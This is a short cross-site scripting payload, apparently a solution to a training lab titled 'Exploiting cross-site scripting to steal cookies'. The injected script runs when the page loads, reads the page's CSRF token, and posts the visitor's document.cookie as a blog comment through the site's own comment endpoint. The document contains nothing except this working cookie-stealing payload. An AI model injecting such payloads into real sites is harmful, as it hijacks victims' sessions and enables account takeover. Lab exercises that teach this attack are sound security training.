<script>
window.addEventListener('DOMContentLoaded', function(){

var token = document.getElementsByName('csrf')[0].value;
var data\ = new FormData();

data.append('csrf', token);
data.append('postId', 6);
data.append('comment', document.cookie);
data.append('email', 'victim');
data.append('email', 'hello@gmail.com');
data.append('website', 'http://hello.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
#Lab: Exploiting cross-site scripting to steal cookies
